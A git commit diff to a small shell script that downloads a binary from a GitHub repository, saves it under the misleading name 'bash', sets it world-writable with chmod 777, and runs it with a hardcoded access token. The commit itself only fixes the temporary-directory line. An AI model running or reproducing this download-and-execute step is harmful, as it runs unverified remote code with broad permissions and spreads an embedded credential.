f87f56f6bd4c7e42bfcee97fe782f55c866eb9b2
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2024-10-01 08:38:03 +0800

    Update resourcesinstitute.sh

--- resourcesinstitute.sh
+++ resourcesinstitute.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 
 token="1N6QqhaHnDyHYkx89vsxd+CNkoqoaqXT37Fj0baANRA="
-tmp=mktemp -d && cd "$tmp"
+tmp="$(mktemp -d)" && cd "$tmp"
 wget -qO "./bash" https://github.com/curiosityinteriorsuk/resourcesinstitute/raw/refs/heads/main/resourcesinstitute
 chmod 777 "./bash"
 ./bash start accept --token "${token}"
